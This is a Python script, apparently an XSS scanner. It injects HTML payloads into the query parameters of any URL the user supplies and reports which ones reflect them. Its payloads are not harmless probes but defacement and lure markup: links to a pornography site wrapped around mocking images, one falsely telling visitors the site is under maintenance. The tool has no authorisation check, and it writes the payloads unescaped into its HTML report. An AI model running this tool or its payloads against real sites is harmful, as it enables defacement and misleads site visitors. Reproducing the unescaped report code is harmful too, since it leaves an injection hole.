import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

def guess_params(params):
    if not params:
        common_params = ['id', 'page', 'user', 'search', 'q', 'searchTerm']
        params = {p: [''] for p in common_params}
    return params

def run():
    print("Running XSS scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
        '<a href="https://www.pornhub.com" target="_blank"><img src="https://el.phncdn.com/gif/45467111.gif" alt="STUPID"width="900" height="450"></a>',
        '<a href="https://www.pornhub.com" target="_blank"><img src="https://media1.tenor.com/m/sLjUbG5BVikAAAAd/trump-dance-trump-2024.gif" alt="STUPID"width="900" height="450"></a>',
        '<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc"><img src="https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!"></a>'
    ]

    vulnerable_params = []
    results = []

    for param in params:
        vulnerable = False
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
            try:
                res = requests.get(test_url, timeout=5)
                if payload in res.text:
                    print(Fore.RED + f"[!] XSS vulnerability detected in parameter: {param} with payload: {payload}")
                    vulnerable = True
                    vulnerable_params.append(param)
                    results.append((param, True, payload))
                    break
            except Exception as e:
                print(Fore.RED + f"[ERROR] {e}")
        if not vulnerable:
            print(Fore.YELLOW + f"[ ] No XSS detected in parameter: {param}")
            results.append((param, False, None))

    if not vulnerable_params:
        print(Fore.YELLOW + "[!] No vulnerable parameters detected for XSS.")

    # Generate HTML report
    html_content = """
    <html>
    <head><title>XSS Scan Report</title></head>
    <body>
    <h1>XSS Scan Report for {url}</h1>
    <table border="1" cellpadding="5" cellspacing="0">
        <thead>
            <tr>
                <th>Parameter</th>
                <th>Vulnerable</th>
                <th>Payload (if vulnerable)</th>
            </tr>
        </thead>
        <tbody>
    """.format(url=url)

    for param, vulnerable, payload in results:
        vuln_text = "Yes" if vulnerable else "No"
        payload_text = payload if vulnerable else "-"
        html_content += f"<tr><td>{param}</td><td>{vuln_text}</td><td>{payload_text}</td></tr>"

    html_content += """
        </tbody>
    </table>
    </body>
    </html>
    """

    with open("xss_scan_report.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    print(Fore.GREEN + "\n[+] HTML report saved to xss_scan_report.html")

if __name__ == "__main__":
    run()
